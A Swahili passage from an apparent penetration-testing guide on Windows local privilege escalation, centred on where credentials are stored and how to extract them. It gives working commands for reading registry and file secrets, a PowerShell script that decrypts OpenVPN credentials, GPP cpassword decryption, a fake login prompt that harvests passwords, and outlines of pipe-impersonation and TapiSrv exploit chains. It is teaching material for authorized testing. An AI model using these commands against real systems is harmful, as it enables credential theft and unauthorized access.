Usakinishaji wa Openfire unaotumia embedded database unaweza kuhifadhi `openfire.script` chini ya `Openfire\embedded-db`. Ikiwa akaunti ya sasa inaweza kuisoma, kagua records za `OFUSER` pamoja na property ya `passwordKey`. [Nyaraka za user-provider za Openfire](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/openfire/user/DefaultUserProvider.html) zinasema kuwa password zinaweza kuhifadhiwa kama plain text au kusimbwa kwa fiche kwa key iliyo kwenye property hiyo. Password iliyorejeshwa ni muhimu kwa privilege escalation ikiwa tu bado ni halali kwa identity yenye ruhusa zaidi; jina la faili peke yake halithibitishi ufikiaji wa kusoma wala matumizi tena ya credential. Njia hiyo ni kidokezo cha inventory, kwa hivyo usijumuishe maudhui ya database au credentials kwenye matokeo ya kawaida ya enumeration.

Faili tofauti ya `Openfire\conf\openfire.xml` inaweza kufichua ports na bind interface zilizosanidiwa za admin console hata kama database ya nje inatumika. Openfire kwa kawaida hufunga admin console kwenye loopback; bado, akaunti ya local inaweza kufikia anwani hiyo ikiwa listener inaendelea kufanya kazi. Kagua listener halisi, admin role iliyoidhinishwa, sera ya kupakia plugin na identity ya Openfire service kwa pamoja. Admin anayeweza kusakinisha plugin anaweza kufanya plugin code iendeshwe katika context ya service, ambayo inaweza kuwa na ruhusa nyingi ikiwa service inaendeshwa kama LocalSystem. Password ya akaunti inayolingana au njia ya usanidi inayoweza kusomwa peke yake haithibitishi ufikiaji wa admin console au utekelezaji wa code. Tazama [mwongozo wa vendor wa usakinishaji na usimamizi wa plugin](https://download.igniterealtime.org/openfire/docs/latest/documentation/install-guide.html) na [property ya plugin-upload API](https://download.igniterealtime.org/openfire/docs/latest/documentation/javadoc/org/jivesoftware/admin/servlet/PluginServlet.html).

### Usanidi wa forensic management server

Usanidi wa Velociraptor server, ambao mara nyingi huitwa `server.config.yaml`, unaweza kuwa na `CA.private_key` ya internal CA. Ikiwa mtumiaji mwenye ruhusa chache anaweza kusoma key hiyo, anaweza kutoa API client certificate. Kama hali hiyo itasababisha ruhusa za juu zaidi hutegemea user roles za server, ufikikaji wa API na identity ambayo server au target agent inaendeshwa nayo. Client configuration huwa na material tofauti; kuipata hakuthibitishi ufikiaji wa server CA. Baadhi ya deployments huhifadhi CA private key offline, kwa hiyo usanidi wa server unaoweza kusomwa unaweza pia kukosa signing key.

Kwenye Windows server, kagua ACL ya usanidi wa **server** kwenye installation directory yake na nakala zozote za backup zilizolindwa. Mahali panapowezekana ni `%ProgramFiles%\VelociraptorServer\server.config.yaml`; tumia njia iliyosanidiwa ya service ikiwa ni tofauti. Thibitisha kuwa identity ya sasa inaweza kusoma faili na kwamba `CA.private_key` ipo kweli. Epuka kuonyesha private key kwenye logs au matokeo ya enumeration. Workflow ya vendor `config api_client` hutumia CA key kutoa client certificate, lakini server-side role yenye ruhusa zinazofaa pia inahitajika; kuunda au kubadilisha role kunaweza kuhitaji datastore write access au kuwasha upya server. Identity iliyopo ya server yenye ruhusa nyingi inaweza kutoa njia hata kama uandishi huo hauwezekani. API queries zenye ruhusa za execution huendeshwa katika context husika ya server au agent, ambayo inaweza kuwa na ruhusa nyingi.

Linda usanidi wa server na backups kwa ACL zenye vizuizi, hifadhi CA signing key offline inapowezekana, na punguza API roles na ufikiaji wa listener. Tazama [nyaraka za Velociraptor API](https://docs.velociraptor.app/docs/server_automation/server_api/) na [mwongozo wa usanidi wa usalama](https://docs.velociraptor.app/docs/deployment/security/).

### Putty Creds

```bash
reg query "HKCU\Software\SimonTatham\PuTTY\Sessions" /s | findstr "HKEY_CURRENT_USER HostName PortNumber UserName PublicKeyFile PortForwardings ConnectionSharing ProxyPassword ProxyUsername" #Check the values saved in each session, user/password could be there
```

Solar-PuTTY ni session manager tofauti. Hifadhi yake asilia iliyosimbwa kwa njia fiche inaweza kuwa `%APPDATA%\SolarWinds\FreeTools\Solar-PuTTY\data.dat`, huku nakala rudufu ya session iliyohamishwa inaweza kuitwa `sessions-backup.dat` na kuhifadhiwa mahali pengine. [Mwongozo wa export wa SolarWinds](https://thwack.solarwinds.com/discussion/comment/115591) unasema kwamba exports zimesimbwa kwa nenosiri na zinaweza kuwa na sessions, keys, scripts, tags na relationships; [jukwaa lao la usaidizi](https://thwack.solarwinds.com/discussion/4520/saved-session-lost) linabainisha hifadhi asilia. Kagua ruhusa za faili na paths kwanza. Kupata mojawapo ya faili hizi hakufichui nenosiri lake wala kuthibitisha kwamba credential yoyote iliyohifadhiwa bado ni halali au ina privileges za juu zaidi.

### Putty SSH Host Keys

```
reg query HKCU\Software\SimonTatham\PuTTY\SshHostKeys\
```

### Funguo za SSH kwenye registry

Funguo binafsi za SSH zinaweza kuhifadhiwa ndani ya ufunguo wa registry `HKCU\Software\OpenSSH\Agent\Keys`, kwa hivyo unapaswa kuangalia kama kuna chochote cha kuvutia humo:

```bash
reg query 'HKEY_CURRENT_USER\Software\OpenSSH\Agent\Keys'
```

Ukipata ingizo lolote ndani ya njia hiyo, huenda likawa ufunguo wa SSH uliohifadhiwa. Huhifadhiwa kwa usimbaji fiche lakini unaweza kusimbuliwa kwa urahisi ukitumia [https://github.com/ropnop/windows_sshagent_extract](https://github.com/ropnop/windows_sshagent_extract).\
Maelezo zaidi kuhusu mbinu hii yanapatikana hapa: [https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)<sup>[[37]](#references)</sup>

Ikiwa huduma ya `ssh-agent` haifanyi kazi na unataka ianze kiotomatiki wakati wa kuwasha kompyuta, endesha:

```bash
Get-Service ssh-agent | Set-Service -StartupType Automatic -PassThru | Start-Service
```

> [!TIP]
> Inaonekana mbinu hii haifanyi kazi tena. Nilijaribu kuunda `ssh keys`, kuziongeza kwa kutumia `ssh-add`, na kuingia kwenye mashine kupitia ssh. Registry HKCU\Software\OpenSSH\Agent\Keys haipo, na procmon haikutambua matumizi ya `dpapi.dll` wakati wa uthibitishaji kwa asymmetric key.

### Faili zisizohudumiwa

```
C:\Windows\sysprep\sysprep.xml
C:\Windows\sysprep\sysprep.inf
C:\Windows\sysprep.inf
C:\Windows\Panther\Unattended.xml
C:\Windows\Panther\Unattend.xml
C:\Windows\Panther\Unattend\Unattend.xml
C:\Windows\Panther\Unattend\Unattended.xml
C:\Windows\System32\Sysprep\unattend.xml
C:\Windows\System32\Sysprep\unattended.xml
C:\unattend.txt
C:\unattend.inf
dir /s *sysprep.inf *sysprep.xml *unattended.xml *unattend.xml *unattend.txt 2>nul
```

Unaweza pia kutafuta faili hizi kwa kutumia **metasploit**: _post/windows/gather/enum_unattend_

Mfano wa maudhui:

```xml
<component name="Microsoft-Windows-Shell-Setup" publicKeyToken="31bf3856ad364e35" language="neutral" versionScope="nonSxS" processorArchitecture="amd64">
    <AutoLogon>
     <Password>U2VjcmV0U2VjdXJlUGFzc3dvcmQxMjM0Kgo==</Password>
     <Enabled>true</Enabled>
     <Username>Administrateur</Username>
    </AutoLogon>

    <UserAccounts>
     <LocalAccounts>
      <LocalAccount wcm:action="add">
       <Password>*SENSITIVE*DATA*DELETED*</Password>
       <Group>administrators;users</Group>
       <Name>Administrateur</Name>
      </LocalAccount>
     </LocalAccounts>
    </UserAccounts>
```

### Nakala rudufu za SAM & SYSTEM

```bash
# Usually %SYSTEMROOT% = C:\Windows
%SYSTEMROOT%\repair\SAM
%SYSTEMROOT%\System32\config\RegBack\SAM
%SYSTEMROOT%\System32\config\SAM
%SYSTEMROOT%\repair\system
%SYSTEMROOT%\System32\config\SYSTEM
%SYSTEMROOT%\System32\config\RegBack\system
```

Faili za backup za Windows Imaging (`.wim`) zinazosomeka zinaweza pia kuwa na hives za `SAM`, `SECURITY`, na `SYSTEM` za offline. Anza na saraka za backup au image zinazofikika ndani ya mfumo, na kagua **majina ya vipengele vilivyomo** kwenye image kabla ya kutoa chochote; jina la faili la `.wim` pekee halithibitishi kuwa hives zimefichuliwa, na image za kawaida za `install.wim`, `boot.wim`, na recovery mara nyingi huwa vihisishi vya uongo. SMB share ni njia tofauti ya ufikiaji, na inapaswa kukaguliwa tu ikiwa share hiyo iko ndani ya wigo. Angalia mwongozo wa Microsoft kuhusu [Windows images](https://learn.microsoft.com/en-us/windows-hardware/manufacture/desktop/work-with-windows-images) na [marejeleo ya faili za registry hive](https://learn.microsoft.com/en-us/windows/win32/sysinfo/registry-hives).

### Vitambulisho vya Cloud

```bash
#From user home
.aws\credentials
AppData\Roaming\gcloud\credentials.db
AppData\Roaming\gcloud\legacy_credentials
AppData\Roaming\gcloud\access_tokens.db
.azure\accessTokens.json
.azure\azureProfile.json
```

### McAfee SiteList.xml

Tafuta faili linaloitwa **SiteList.xml**

### Nenosiri la GPP Lililohifadhiwa kwenye Cache

Hapo awali kulikuwa na kipengele kilichoruhusu kusambaza akaunti maalum za msimamizi wa ndani kwenye kundi la mashine kupitia Group Policy Preferences (GPP). Hata hivyo, mbinu hii ilikuwa na dosari kubwa za usalama. Kwanza, Group Policy Objects (GPOs), zilizohifadhiwa kama faili za XML kwenye SYSVOL, zingeweza kufikiwa na mtumiaji yeyote wa domain. Pili, manenosiri ndani ya GPP hizi, yaliyosimbwa kwa AES256 kwa kutumia ufunguo chaguomsingi uliowekwa wazi, yangeweza kusimbuliwa na mtumiaji yeyote aliyeidhinishwa. Hili lilileta hatari kubwa, kwani lingeweza kuwawezesha watumiaji kupata marupurupu ya juu.

Ili kupunguza hatari hii, ilitengenezwa function ya kutafuta faili za GPP zilizohifadhiwa kwenye cache na zenye sehemu ya "cpassword" isiyo tupu. Ikipata faili kama hiyo, function husimbua nenosiri na kurejesha object maalum ya PowerShell. Object hii inajumuisha maelezo kuhusu GPP na mahali faili ilipo, na kusaidia kutambua na kurekebisha tatizo hili la usalama.

Tafuta faili hizi kwenye `C:\ProgramData\Microsoft\Group Policy\history` au kwenye _**C:\Documents and Settings\All Users\Application Data\Microsoft\Group Policy\history** (kabla ya W Vista)_:

- Groups.xml
- Services.xml
- Scheduledtasks.xml
- DataSources.xml
- Printers.xml
- Drives.xml

**Kusimbua cPassword:**

```bash
#To decrypt these passwords you can decrypt it using
gpp-decrypt j1Uyj3Vx8TY9LtLZil2uAuZkFQA/4latT76ZwgdHdhw
```

Kutumia crackmapexec kupata nywila:

```bash
crackmapexec smb 10.10.10.10 -u username -p pwd -M gpp_autologin
```

### IIS Web Config

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

```bash
C:\Windows\Microsoft.NET\Framework64\v4.0.30319\Config\web.config
type C:\Windows\Microsoft.NET\Framework644.0.30319\Config\web.config | findstr connectionString
C:\inetpub\wwwroot\web.config
```

```bash
Get-Childitem –Path C:\inetpub\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
Get-Childitem –Path C:\xampp\ -Include web.config -File -Recurse -ErrorAction SilentlyContinue
```

Mfano wa web.config yenye credentials:

```xml
<authentication mode="Forms">
    <forms name="login" loginUrl="/admin">
        <credentials passwordFormat = "Clear">
            <user name="Administrator" password="SuperAdminPassword" />
        </credentials>
    </forms>
</authentication>
```

### Nyaraka za chelezo kwenye webroot ya IIS

ZIP ya zamani ya chelezo iliyowekwa moja kwa moja kwenye webroot inayotolewa inaweza kufichua faili za usanidi za awali na credentials zinazoweza kutumika tena. Kagua physical path iliyosanidiwa ya tovuti na uhakikishe kama archive inaweza kufikiwa kupitia HTTP kabla ya kuichukulia kama ufichuzi. Njia chaguomsingi ya `C:\inetpub\wwwroot` ni sehemu ya kuanzia tu. Orodha ya haraka ya ndani inaweza kuonyesha majina na ukubwa bila kufungua archives:

```powershell
Get-ChildItem -LiteralPath 'C:\inetpub\wwwroot' -File -Filter '*.zip' -ErrorAction SilentlyContinue |
  Where-Object Name -Match 'backup' | Select-Object Name, Length
```

Jina la archive halithibitishi kuwa ina siri au kwamba credential iliyopatikana inatoa haki za juu.

### Credentials za OpenVPN

```csharp
Add-Type -AssemblyName System.Security
$keys = Get-ChildItem "HKCU:\Software\OpenVPN-GUI\configs"
$items = $keys | ForEach-Object {Get-ItemProperty $_.PsPath}

foreach ($item in $items)
{
  $encryptedbytes=$item.'auth-data'
  $entropy=$item.'entropy'
  $entropy=$entropy[0..(($entropy.Length)-2)]

  $decryptedbytes = [System.Security.Cryptography.ProtectedData]::Unprotect(
    $encryptedBytes,
    $entropy,
    [System.Security.Cryptography.DataProtectionScope]::CurrentUser)

  Write-Host ([System.Text.Encoding]::Unicode.GetString($decryptedbytes))
}
```

### Logs

```bash
# IIS
C:\inetpub\logs\LogFiles\*

#Apache
Get-Childitem –Path C:\ -Include access.log,error.log -File -Recurse -ErrorAction SilentlyContinue
```

### Omba taarifa za kuingia

Unaweza kila wakati **kumwomba mtumiaji aingize taarifa zake za kuingia au hata za mtumiaji mwingine** ikiwa unafikiri anaweza kuzifahamu (kumbuka kwamba **kumwomba** mteja moja kwa moja **taarifa za kuingia** ni **hatari** sana):

```bash
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\'+[Environment]::UserName,[Environment]::UserDomainName); $cred.getnetworkcredential().password
$cred = $host.ui.promptforcredential('Failed Authentication','',[Environment]::UserDomainName+'\\'+'anotherusername',[Environment]::UserDomainName); $cred.getnetworkcredential().password

#Get plaintext
$cred.GetNetworkCredential() | fl
```

### **Majina ya faili yanayoweza kuwa na taarifa za kuingia**

Faili zinazojulikana kuwa na **nywila** katika **maandishi wazi** au Base64 hapo awali

```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
*.psafe3
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```

Hifadhidata za Password Safe v3 kwa kawaida hutumia kiendelezi cha `.psafe3`. Chukulia jina la faili linalolingana kuwa kiashiria cha vault iliyosimbwa kwa njia fiche; uwepo wake hauthibitishi kwamba unaweza kuisoma, kuifungua au kutumia kitambulisho chochote kilichohifadhiwa humo. Unapokagua mahali faili hizo zimehifadhiwa, angalia wasifu wa watumiaji unaoweza kufikia na mizizi ya kushiriki faili iliyosanidiwa.

Faili ya KeePass `.kdbx` inayosomeka pia ni kiashiria tu cha vault iliyosimbwa kwa njia fiche. Ili kuifungua, unahitaji nenosiri kuu halisi pamoja na faili yoyote ya ufunguo au vipengele vya akaunti vilivyosanidiwa. Ikiwa ukaguzi ulioidhinishwa utapata jozi ya hash ya LM:NT kwenye ingizo, thibitisha akaunti iliyotajwa na kama hash ya NT bado inatumika na inakubaliwa na huduma ya NTLM ya lengo kabla ya kufikiria kutumia [pass-the-hash](../ntlm/README.md#pass-the-hash). Ingizo la vault halikupi haki za Administrator au SYSTEM lenyewe; ufikiaji wa huduma ya mbali, haki za akaunti na hatua yoyote tofauti ya kutekeleza huduma lazima pia ziwepo. Orodha ya mali inapaswa kuripoti njia ya vault na kama inasomeka, wala si kuchapisha hifadhidata au kitambulisho kilichohifadhiwa.

Tafuta faili zote zilizopendekezwa:

```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == *.psafe3 == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```

### Credentials katika RecycleBin

Kagua maingizo ya Recycle Bin unayoweza kufikia ili kutafuta nakala rudufu na kumbukumbu za usanidi zilizofutwa, pamoja na faili ambazo majina yake yanataja credentials waziwazi. Nakala rudufu muhimu ya `.7z`, `.zip`, au `.rar` inaweza kuwa na miezi kadhaa na kuwa na jina la kawaida. Windows huhifadhi njia asili na muda wa kufutwa kwenye rekodi ya `$I`, na faili iliyofutwa kama ingizo lake linalolingana la `$R`; kagua metadata na ruhusa za sasa za identity yako za kusoma kabla ya kufungua kumbukumbu. Kinachoonekana hutegemea volume, SID ya mtumiaji, na ruhusa za faili, kwa hivyo orodha tupu haithibitishi kwamba hakuna nakala rudufu inayoweza kurejeshwa. Chukulia jina la kumbukumbu kama kitu cha kukagua, si uthibitisho kwamba lina secret halali.

Faili ya `.pfx` iliyofutwa unayoweza kufikia inaweza pia kuwa kidokezo cha **code-signing**. Ikiwa ina private key unayoweza kufikia, key hiyo inaweza kusaini script iliyobadilishwa ya PowerShell; [PowerShell inahitaji certificate ya code-signing yenye private key](https://learn.microsoft.com/en-us/powershell/module/microsoft.powershell.security/set-authenticodesignature), na [sheria za AppLocker za publisher hukagua utambulisho wa mtia-saini na wigo wa sheria](https://learn.microsoft.com/en-us/windows/security/application-security/application-control/app-control-for-business/applocker/understanding-the-publisher-rule-condition-in-applocker). Utekelezaji kati ya akaunti tofauti unahitaji identity ya sasa iweze kurekebisha script husika, sheria inayotumika ikubali signature inayotokana nayo kwa script na akaunti lengwa, na scheduled task au mchakato mwingine wenye ruhusa za juu zaidi uiendeshe kwa hakika. Jina la faili la `.pfx`, subject ya certificate, au script inayoweza kuandikwa peke yake havithibitishi mnyororo huu. Kagua metadata, ACL, sera, na amri ya scheduled task kabla ya kufungua private-key material au kuanzisha task.

Pia kagua hifadhidata za profile za messaging client, notes na faili zilizopokelewa unazoweza kufikia ili kutafuta vidokezo vya credentials. Export ya urejeshaji wa BitLocker inaweza kuhifadhiwa kama HTML au TXT, wakati mwingine ndani ya kumbukumbu ya nakala rudufu yenye jina. Nyenzo kama hizi zinaweza kutoa ufikiaji wa volume tofauti ya data iliyosimbwa kwa njia fiche iliyo na nakala rudufu za zamani; kagua volume na kumbukumbu hiyo tu ikiwa umeidhinishwa. Ikiwa nakala rudufu inajumuisha `NTDS.dit`, urejeshaji wa credentials za domain nje ya mtandao pia unahitaji hive ya `SYSTEM` inayolingana, kama ilivyoelezwa kwenye [mchakato wa nakala rudufu na vikundi vyenye ruhusa za juu](../active-directory-methodology/privileged-groups-and-token-privileges.md). Majina ya faili na volume iliyofungwa pekee havithibitishi kuwa kuna recovery key inayoweza kutumika au nakala rudufu ya domain.

Ili **kurejesha nywila** zilizohifadhiwa na programu kadhaa, unaweza kutumia: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Ndani ya registry

**Vifunguo vingine vinavyowezekana vya registry vyenye credentials**

```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```

[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### Historia ya Browsers

Unapaswa kukagua database ambako nywila za **Chrome, Edge, au Firefox** huhifadhiwa.\
Pia kagua historia, bookmarks na favourites za browsers ili kuona kama huenda **nywila zimehifadhiwa** humo.

Kwa profile ya kawaida ya **Default** ya Edge ya mtumiaji wa sasa, `Login Data` iko kwenye `%LOCALAPPDATA%\Microsoft\Edge\User Data\Default`, ilhali `Local State` iko kwenye saraka yake kuu ya `User Data`. [Microsoft inaeleza mahali pa kawaida pa profile](https://learn.microsoft.com/en-us/deployedge/edge-learnmore-create-user-directory-vars); profile nyingine au sera ya `UserDataDir` inaweza kuibadilisha. Kuwepo kwa faili ni kidokezo tu cha mahali pa kutafuta credentials: thibitisha kuwa faili zinaweza kusomwa, kuwa una muktadha wa DPAPI wa mtumiaji husika au key material nyingine iliyoidhinishwa, na kama login iliyohifadhiwa ni ya akaunti yenye privileges za juu zaidi. Kukagua paths pekee hakuhitaji kufungua database wala kuchapisha nywila zilizodecryptiwa.

Kwa Firefox, [Mozilla inaeleza](https://support.mozilla.org/en-US/kb/recovering-important-data-from-an-old-profile) kuwa `key4.db` na `logins.json` za profile ni faili zinazooanishwa za key na login zilizosimbwa kwa njia fiche. Kuwepo kwake ni kidokezo tu: angalia kama faili zote mbili zinaweza kusomwa, kama kuna entries zilizohifadhiwa, na kama Primary Password inalinda key kabla ya kuhitimisha kuwa credentials zinaweza kutumiwa. Ikiwa credential iliyopatikana ni ya akaunti ya domain, kagua kando haki halisi za udhibiti wa group za akaunti hiyo na [haki za kusoma au kufungua kwa decryption nywila za LAPS za group](../active-directory-methodology/laps.md); browser artifacts pekee hazithibitishi njia ya kupata administrator.

Tools za kutoa nywila kutoka browsers:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **Kuandika Juu ya COM DLL**

**Component Object Model (COM)** ni teknolojia iliyojengwa ndani ya mfumo endeshi wa Windows inayowezesha **mawasiliano** kati ya vipengele vya software vilivyoandikwa kwa lugha tofauti. Kila kipengele cha COM **hutambuliwa kwa class ID (CLSID)**, na kila kipengele hutoa utendaji kupitia interface moja au zaidi, zinazotambuliwa kwa interface IDs (IIDs).

COM classes na interfaces hufafanuliwa kwenye registry chini ya **HKEY\CLASSES\ROOT\CLSID** na **HKEY\CLASSES\ROOT\Interface** mtawalia. Registry hii huundwa kwa kuunganisha **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** = **HKEY\CLASSES\ROOT.**

Ndani ya CLSIDs za registry hii unaweza kupata registry child **InProcServer32** yenye **default value** inayoelekeza kwenye **DLL**, pamoja na value inayoitwa **ThreadingModel** ambayo inaweza kuwa **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single au Multi) au **Neutral** (Thread Neutral).

![Historia ya Browsers - Kuandika Juu ya COM DLL: Ndani ya CLSIDs za registry hii unaweza kupata registry child InProcServer32 yenye default value inayoelekeza kwenye DLL na value...](<../../images/image (729).png>)

Kimsingi, ikiwa unaweza **kuandika juu ya DLL yoyote** itakayotekelezwa, unaweza **kuongeza privileges** ikiwa DLL hiyo itatekelezwa na mtumiaji tofauti.

Ili kujifunza jinsi attackers wanavyotumia COM Hijacking kama njia ya persistence, angalia:


{{#ref}}
com-hijacking.md
{{#endref}}

### **Utafutaji wa Kawaida wa Nywila kwenye Faili na Registry**

**Tafuta maudhui ya faili**

```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```

**Tafuta faili kwa jina fulani**

```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```

**Tafuta majina ya key na nywila kwenye registry**

```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```

### Zana zinazotafuta nywila

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **ni plugin ya msf** niliyoitengeneza ili **kuendesha kiotomatiki kila POST module ya metasploit inayotafuta credentials** ndani ya mwathiriwa.\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) hutafuta kiotomatiki faili zote zilizo na nywila zilizotajwa kwenye ukurasa huu.\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) ni zana nyingine nzuri ya kutoa nywila kutoka kwenye mfumo.

Zana ya [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) hutafuta **sessions**, **usernames** na **nywila** za zana kadhaa zinazohifadhi data hii katika maandishi ya wazi (PuTTY, WinSCP, FileZilla, SuperPuTTY, na RDP)

```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```

## Leaked Handlers

Fikiria kwamba **process inayoendeshwa kama SYSTEM inafungua process mpya** (`OpenProcess()`) ikiwa na **full access**. Process hiyo hiyo **pia inaunda process mpya** (`CreateProcess()`) **yenye low privileges lakini inayorithi handles zote zilizo wazi za process kuu**.\
Kisha, ikiwa una **full access kwa process yenye low privileges**, unaweza kuchukua **handle iliyo wazi ya process yenye privileged iliyoundwa** kwa kutumia `OpenProcess()` na **kuingiza shellcode**.\
[Soma mfano huu ili kupata maelezo zaidi kuhusu **jinsi ya kugundua na kutumia vulnerability hii**.](leaked-handle-exploitation.md)\
[Soma **chapisho hili lingine kwa maelezo kamili zaidi kuhusu jinsi ya kupima na kutumia vibaya handles nyingine zilizo wazi za processes na threads zinazorithiwa zikiwa na viwango tofauti vya permissions (si full access pekee)**](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

Sehemu za kumbukumbu zinazoshirikiwa, zinazoitwa **pipes**, huwezesha mawasiliano na uhamishaji wa data kati ya processes.

Windows hutoa kipengele kinachoitwa **Named Pipes**, kinachoruhusu processes zisizohusiana kushiriki data, hata kupitia mitandao tofauti. Hii inafanana na usanifu wa client/server, ambapo roles hufafanuliwa kama **named pipe server** na **named pipe client**.

Data inapotumwa kupitia pipe na **client**, **server** iliyosanidi pipe inaweza **kujifanya kuwa** **client**, ikiwa ina haki zinazohitajika za **SeImpersonate**. Kutambua **process yenye privileged** inayowasiliana kupitia pipe unayoweza kuiga kunakupa fursa ya **kupata privileges za juu zaidi** kwa kujifanya kuwa process hiyo inapowasiliana na pipe uliyoanzisha. Kwa maelekezo ya kutekeleza shambulio hilo, miongozo hii inaweza kusaidia [**hapa**](named-pipe-client-impersonation.md) na [**hapa**](#from-high-integrity-to-system).

Pia, tool ifuatayo inaruhusu **kuingilia mawasiliano ya named pipe kwa kutumia tool kama burp:** [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **na tool hii inaruhusu kuorodhesha na kuona pipes zote ili kupata privescs** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

Huduma ya Telephony (TapiSrv) katika hali ya server hufichua `\\pipe\\tapsrv` (MS-TRP). Client ya mbali iliyothibitishwa inaweza kutumia vibaya njia ya matukio ya async inayotumia mailslot ili kubadilisha `ClientAttach` kuwa **uandishi wa byte 4** katika faili yoyote iliyopo na inayoweza kuandikwa na `NETWORK SERVICE`, kisha kupata haki za Telephony admin na kupakia DLL yoyote kama huduma. Mchakato kamili:

- Tuma `ClientAttach` huku `pszDomainUser` ikiwa na njia iliyopo inayoweza kuandikwa → huduma huifungua kwa `CreateFileW(..., OPEN_EXISTING)` na kuitumia kuandika matukio ya async.
- Kila tukio huandika `InitContext` inayodhibitiwa na mshambulizi kutoka `Initialize` hadi kwenye handle hiyo. Sajili line app kwa `LRegisterRequestRecipient` (`Req_Func 61`), anzisha `TRequestMakeCall` (`Req_Func 121`), pata data kupitia `GetAsyncEvents` (`Req_Func 0`), kisha futa usajili/zima huduma ili kurudia uandishi kwa njia inayotabirika.
- Jiongeze kwenye `[TapiAdministrators]` katika `C:\Windows\TAPI\tsec.ini`, unganisha tena, kisha piga `GetUIDllName` ukiwa na njia ya DLL yoyote ili kutekeleza `TSPI_providerUIIdentify` kama `NETWORK SERVICE`.

Maelezo zaidi:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## Mengineyo

### File Extensions zinazoweza kuendesha vitu katika Windows

Angalia ukurasa **[https://filesec.io/](https://filesec.io/)**

